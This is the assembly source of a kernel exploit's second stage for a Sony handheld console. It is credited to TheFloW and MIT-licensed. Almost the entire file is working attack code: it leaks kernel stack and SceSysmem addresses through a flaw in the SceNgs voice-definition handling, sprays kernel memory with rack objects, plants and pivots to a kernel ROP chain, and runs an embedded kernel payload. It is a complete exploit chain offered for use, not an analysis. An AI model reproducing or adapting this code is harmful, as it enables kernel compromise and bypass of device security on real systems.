/* stage2.S -- implementation of the kernel exploit
 *
 * Copyright (C) 2018 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

.include "../include/constants.S"
.include "../include/functions.S"
.include "../include/gadgets.S"
.include "../include/macros.S"
.include "krop.S"

// Kernel stack base start and step
.equ KSTACK_BASE_START,      0x1000
.equ KSTACK_BASE_STEP,       0x1000

// Layout for voice definition
.equ FAKE_COPYOUT_OFFSET,    0x40
.equ FAKE_COPYOUT_SIZE,      0xa0
.equ OVERWRITE_OFFSET,       0x40
.equ OVERWRITE_SIZE,         0x64
.equ FAKE_HEADER_OFFSET,     0xb0
.equ FAKE_HEADER_SIZE,       0x80
.equ PRESET_LIST_OFFSET,     0x130

// copyout params offset
.equ COPYOUT_PARAMS_OFFSET,  0xa0

// SceLibKernel offsets
.equ SCE_LIB_KERNEL_OFFSET,  -0xa4b7
.equ GET_MODULE_LIST_OFFSET, 0x675c
.equ GET_MODULE_INFO_OFFSET, 0x676c
.equ GET_THREAD_INFO_OFFSET, 0xa791
.equ DEVCTL_OFFSET,          0xa55d

// SceNgsUser offsets
.equ SYSTEM_GET_SIZE_OFFSET, 0x54d
.equ SYSTEM_INIT_OFFSET,     0x57d
.equ RACK_GET_SIZE_OFFSET,   0xb29
.equ RACK_INIT_OFFSET,       0xb65
.equ RACK_RELEASE_OFFSET,    0xda1

.macro set_preset i, src, size
  .set index, (\i) * 0x18
  .set offset, \src - (PRESET_LIST_OFFSET + index)
  call_vvv memset, voice_def_buf + PRESET_LIST_OFFSET + index, 0, 0x18
  store_vv offset, voice_def_buf + PRESET_LIST_OFFSET + index + 0x08 // nPresetDataOffset
  store_vv \size,  voice_def_buf + PRESET_LIST_OFFSET + index + 0x0c // uSizePresetData
.endm

.macro set_preset_dummy i, src, size
  .set index, (\i) * 0x18
  .set offset, \src - (PRESET_LIST_OFFSET + index)
  call_vvv memset, voice_def_buf + PRESET_LIST_OFFSET + index, 0, 0x18
  store_vv offset, voice_def_buf + PRESET_LIST_OFFSET + index + 0x00 // nNameOffset
  store_vv \size,  voice_def_buf + PRESET_LIST_OFFSET + index + 0x04 // uNameLength
.endm

.macro trigger_exploit
  // Plant fake voice definition into kernel stack
  load_call_vvvvvv sceIoDevctl, empty_string, 0, voice_def_buf, 0x3ff, NULL, 0

  // Determine memory requirement for rack
  load_call_lvv sceNgsRackGetRequiredMemorySize, sys_handle, rack_desc, buffer_info + 0x04

  // Allocate rack memory
  call_vl  memalign, 256, buffer_info + 0x04
  store_rv           ret, buffer_info + 0x00

  // Call vulnerable function
  load_call_lvvv sceNgsRackInit, sys_handle, buffer_info, rack_desc, rack_handle

  // Free rack memory
  call_l free, buffer_info + 0x00

  // Release rack handle
  load_call_lv sceNgsRackRelease, rack_handle, NULL
.endm

.global _start
_start:
  /** STAGE 1: Initialize framebuffer and ngs system **/

  // Terminate vdispThread so we can draw our own screen
  call_vv vdispSetState, vdispCtrl, VDISP_STATE_EXIT
  call_v  vdispEnd,      vdispCtrl

  // Allocate memory in cdram
  call_vvvv sceKernelAllocMemBlock,   empty_string, SCE_KERNEL_MEMBLOCK_TYPE_USER_CDRAM_RW, 0x200000, NULL
  call_rv   sceKernelGetMemBlockBase, ret, framebuf + 0x04

  // Set framebuf
  call_vv sceDisplaySetFrameBuf, framebuf, SCE_DISPLAY_SETBUF_NEXTFRAME

  // Flash white
  call_lvv memset, framebuf + 0x04, 0xff, 960 * 544 * 4

  // Get SceLibKernel base address
  call_v   sceIoOpen, 0xDEADBEEF
  get_lr
  add_rv   ret, SCE_LIB_KERNEL_OFFSET
  store_rv ret, libkernel_base

  // Get SceLibKernel functions
  load_add_store sceKernelGetModuleList, libkernel_base, GET_MODULE_LIST_OFFSET
  load_add_store sceKernelGetModuleInfo, libkernel_base, GET_MODULE_INFO_OFFSET
  load_add_store sceKernelGetThreadInfo, libkernel_base, GET_THREAD_INFO_OFFSET
  load_add_store sceIoDevctl,            libkernel_base, DEVCTL_OFFSET

  // Load SceNgsUser module
  call_v sceSysmoduleLoadModule, SCE_SYSMODULE_NGS

  // Get first entry of module list which should be SceNgsUser
  store_vv      1, mod_count
  load_call_vvv sceKernelGetModuleList, 0xff, mod_list, mod_count

  // Get SceNgsUser base address
  store_vv     0x1b8, mod_info + 0x00
  load_call_lv sceKernelGetModuleInfo, mod_list + 0x00, mod_info
  store_lv     mod_info + 0x15c, ngs_base

  // Get SceNgsUser functions
  load_add_store sceNgsSystemGetRequiredMemorySize, ngs_base, SYSTEM_GET_SIZE_OFFSET
  load_add_store sceNgsSystemInit,                  ngs_base, SYSTEM_INIT_OFFSET
  load_add_store sceNgsRackGetRequiredMemorySize,   ngs_base, RACK_GET_SIZE_OFFSET
  load_add_store sceNgsRackInit,                    ngs_base, RACK_INIT_OFFSET
  load_add_store sceNgsRackRelease,                 ngs_base, RACK_RELEASE_OFFSET

  // Determine memory requirement for system
  load_call_vv sceNgsSystemGetRequiredMemorySize, init_params, sys_size

  // Allocate system memory
  call_vl  memalign, 256, sys_size
  store_rv           ret, sys_mem

  // Initialize ngs system
  load_call_llvv sceNgsSystemInit, sys_mem, sys_size, init_params, sys_handle

  /** STAGE 2: Search kernel stack base address **/

  // Set up fake voice definition
  call_vvv memset,                         voice_def_buf, 0, 0x400
  store_vv SCE_NGS_VOICE_DEFINITION_MAGIC, voice_def_buf + 0x00
  store_vv SCE_NGS_VOICE_DEFINITION_FLAGS, voice_def_buf + 0x04
  store_vv 0x40,                           voice_def_buf + 0x08
  store_vv 0x40,                           voice_def_buf + 0x0c

  // Plant fake voice definition into kernel stack
  load_call_vvvvvv sceIoDevctl, empty_string, 0, voice_def_buf, 0x3ff, NULL, 0

  // Iterate through kernel memory
  loop_start:
    // kstack_base += KSTACK_BASE_STEP
    load_add_store kstack_base, kstack_base, KSTACK_BASE_STEP

    // rack_desc.pVoiceDefn = kstack_base ^ SCE_NGS_VOICE_DEFINITION_XOR
    xor_rv   ret, SCE_NGS_VOICE_DEFINITION_XOR
    store_rv ret, rack_desc + 0x00

    // Call sceNgsRackGetRequiredMemorySize on the xor'ed kstack_base
    load_call_lvv_2 sceNgsRackGetRequiredMemorySize, sys_handle, rack_desc, buffer_info + 0x04

    // Compare ret with SCE_NGS_ERROR_INVALID_PARAM and return 1 if equal, else 0
    cmp_eq_rv ret, SCE_NGS_ERROR_INVALID_PARAM

    // ret = ret * (loop_start - loop_end) + loop_end
    mul_add_rvv ret, loop_start - loop_end, loop_end

    // Stack pivot
    store_rv         ret, ldm_data_r0 + 0x0c
    set_r0_r2_ip_sp_lr_pc ldm_data_r0
  loop_end:

  // Get kernel stack base address
  load_add_store kstack_base, kstack_base, -KSTACK_DEVCTL_INDATA_OFFSET

  /** STAGE 3: Defeat kernel ASLR **/

  // Set presets information in voice definition
  store_vv PRESET_LIST_OFFSET, voice_def_buf + 0x30
  store_vv 2,                  voice_def_buf + 0x34

  // Set presets
  set_preset 0, 0,                   -(0x148 + 2 * 0x18) + COPYOUT_PARAMS_OFFSET
  set_preset 1, FAKE_COPYOUT_OFFSET, FAKE_COPYOUT_SIZE

  // Overwrite copyout's dst, src and len
  call_vvv memset,      voice_def_buf + FAKE_COPYOUT_OFFSET, 0, FAKE_COPYOUT_SIZE
  store_vv sysmem_base, voice_def_buf + FAKE_COPYOUT_OFFSET + 0x04 // dst
  add_lv   kstack_base, KSTACK_SYSMEM_OFFSET
  store_rv ret,         voice_def_buf + FAKE_COPYOUT_OFFSET + 0x08 // src
  store_vv 4,           voice_def_buf + FAKE_COPYOUT_OFFSET + 0x1c // len

  // Trigger exploit
  trigger_exploit

  // Get SceSysmem base address
  load_add_store sysmem_base, sysmem_base, SCE_SYSMEM_OFFSET

  /** STAGE 4: Kernel spraying **/

  // Set presets information in voice definition
  store_vv PRESET_LIST_OFFSET, voice_def_buf + 0x30
  store_vv 1,                  voice_def_buf + 0x34

  // Set dummy preset to make the SceNgsBlock 0x2000 bytes big
  set_preset_dummy 0, -KSTACK_DEVCTL_INDATA_OFFSET, 0x1000

  // Plant fake voice definition into kernel stack
  load_call_vvvvvv sceIoDevctl, empty_string, 0, voice_def_buf, 0x3ff, NULL, 0

  // Determine memory requirement for rack
  load_call_lvv sceNgsRackGetRequiredMemorySize, sys_handle, rack_desc, buffer_info + 0x04

  // Allocate rack memory
  call_vl  memalign, 256, buffer_info + 0x04
  store_rv           ret, buffer_info + 0x00

  // Spraying
  .rept 40
    load_call_lvvv sceNgsRackInit, sys_handle, buffer_info, rack_desc, rack_handle
  .endr

  // Initialize two more racks
  load_call_lvvv sceNgsRackInit, sys_handle, buffer_info, rack_desc, rack_first
  load_call_lvvv sceNgsRackInit, sys_handle, buffer_info, rack_desc, rack_second

  // Free rack memory
  call_l free, buffer_info + 0x00

  /** STAGE 5: Prepare target **/

  // Build kernel rop chain
  build_krop krop_buf

  // Release first rack handle to make a hole
  load_call_lv sceNgsRackRelease, rack_first, NULL

  // Create a new thread to allocate another kernel stack which should occupy the block of the first released rack
  call_vvvvvvv sceKernelCreateThread, empty_string, pop_pc, SCE_KERNEL_DEFAULT_PRIORITY, 0x1000, 0, 0, NULL
  store_rv     ret, thread_id

  // Get thread stack base address
  store_vv     0x7c, thread_info + 0x00
  load_call_lv sceKernelGetThreadInfo, thread_id, thread_info
  store_lv     thread_info + 0x34, thread_stack_base

  // Start thread to plant the kernel rop chain into the new kernel stack and wait for its execution
  call_lvv sceKernelStartThread, thread_id, thread_rop_end - thread_rop_start, thread_rop_start

  /** STAGE 6: Trigger kernel rop execution **/

  // Release second rack handle
  load_call_lv sceNgsRackRelease, rack_second, NULL

  // Set presets information in voice definition
  store_vv PRESET_LIST_OFFSET, voice_def_buf + 0x30
  store_vv 4,                  voice_def_buf + 0x34

  // Set presets
  set_preset 0, 0,                  -(0x148 + 4 * 0x18) - OVERWRITE_SIZE
  set_preset 1, OVERWRITE_OFFSET,   OVERWRITE_SIZE
  set_preset 2, FAKE_HEADER_OFFSET, FAKE_HEADER_SIZE
  set_preset 3, 0,                  0x1000 // Makes the SceNgsBlock 0x2000 bytes big, but will be ignored

  // Build pivot kernel rop chain
  build_pivot_krop voice_def_buf + OVERWRITE_OFFSET

  // Exit and delete thread once the syscall returns back to user
  store_lv thread_stack_base,         voice_def_buf + OVERWRITE_OFFSET + 0x54 // sp
  store_vv pop_pc,                    voice_def_buf + OVERWRITE_OFFSET + 0x58 // lr
  store_vv sceKernelExitDeleteThread, voice_def_buf + OVERWRITE_OFFSET + 0x5c // pc

  // Fake header to force an early termination, such that we can avoid any possible crashes
  call_vvv memset, voice_def_buf + FAKE_HEADER_OFFSET, 0, FAKE_HEADER_SIZE

  // Trigger exploit
  trigger_exploit

  /** STAGE 7: Cleanup **/

  // Free system memory
  call_l free, sys_mem

  // Release system handle
  // load_call_l sceNgsSystemRelease, sys_handle

  // Wait for thread to end (we should have executed the kernel payload by the time this wakes up)
  call_lvv sceKernelWaitThreadEnd, thread_id, NULL, NULL

  // Exit and delete thread
  call_v sceKernelExitDeleteThread, 0

// Data section

// Thread rop chain
thread_rop_start:
  // Plant kernel rop chain into kernel stack
  load_call_vvvvvv sceIoDevctl, empty_string, 0, krop_buf, 0x3ff, NULL, 0

  // After 100ms the syscall will pop the overwritten return address from kernel stack
  call_v sceKernelDelayThread, 100 * 1000

  // Exit and delete thread
  call_v sceKernelExitDeleteThread, 0
thread_rop_end:

// ldm data for setting sp
ldm_data_r0:                       .word 0xDEADBEEF // r0
                                   .word 0xDEADBEEF // r2
                                   .word 0xDEADBEEF // ip
                                   .word 0xDEADBEEF // sp
                                   .word 0xDEADBEEF // lr
                                   .word pop_pc     // pc

// ldm data for setting lr
ldm_data_r8:                       .word 0xDEADBEEF // r0
                                   .word 0xDEADBEEF // r1
                                   .word 0xDEADBEEF // r4
                                   .word 0xDEADBEEF // r5
                                   .word 0xDEADBEEF // sl
                                   .word 0xDEADBEEF // ip
                                   .word 0xDEADBEEF // lr
                                   .word pop_pc     // pc

// Framebuf
framebuf:                          .word 24         // size
                                   .word 0xDEADBEEF // base
                                   .word 960        // pitch
                                   .word 0          // pixelformat
                                   .word 960        // width
                                   .word 544        // height

// Ngs system init params
init_params:                       .word 64         // nMaxRacks
                                   .word 64         // nMaxVoices
                                   .word 512        // nGranularity
                                   .word 48000      // nSampleRate
                                   .word 1          // nMaxModules

// Rack description
rack_desc:                         .word 0xDEADBEEF // pVoiceDefn
                                   .word 1          // nVoices
                                   .word 1          // nChannelsPerVoice
                                   .word 0          // nMaxPatchesPerInput
                                   .word 0          // nPatchesPerOutput
                                   .word 0          // pUserReleaseData

// Message :)
message:                           .word 0xDEADBEEF
                                   .string "Hi Sony! Hire me :)"

// Kernel payload
payload_start:
.incbin "payload.bin.gz", 0xa // skip gzip header
payload_end:
.set payload_size, payload_end - payload_start
.balign 0x4

// Base addresses
kstack_base:                       .word KSTACK_BASE_START - KSTACK_BASE_STEP + KSTACK_DEVCTL_INDATA_OFFSET
sysmem_base:                       .word 0
libkernel_base:                    .word 0
ngs_base:                          .word 0

// SceLibKernel functions
sceKernelGetModuleList:            .word 0
sceKernelGetModuleInfo:            .word 0
sceKernelGetThreadInfo:            .word 0
sceIoDevctl:                       .word 0

// SceNgsUser functions
sceNgsSystemGetRequiredMemorySize: .word 0
sceNgsSystemInit:                  .word 0
sceNgsRackGetRequiredMemorySize:   .word 0
sceNgsRackInit:                    .word 0
sceNgsRackRelease:                 .word 0

// Module variables
mod_count:                         .word 0
mod_list:                          .zero 0x4
mod_info:                          .zero 0x1b8

// Thread variables
thread_id:                         .word 0
thread_stack_base:                 .word 0
thread_info:                       .zero 0x7c

// Ngs system variables
sys_handle:                        .word 0
sys_mem:                           .word 0
sys_size:                          .word 0

// Ngs rack variables
buffer_info:                       .word 0 // data
                                   .word 0 // size

rack_handle:                       .word 0
rack_first:                        .word 0
rack_second:                       .word 0

// Voice definition buffer
voice_def_buf:                     .zero 0x400

// Kernel rop chain buffer
krop_buf:                          .zero 0x400
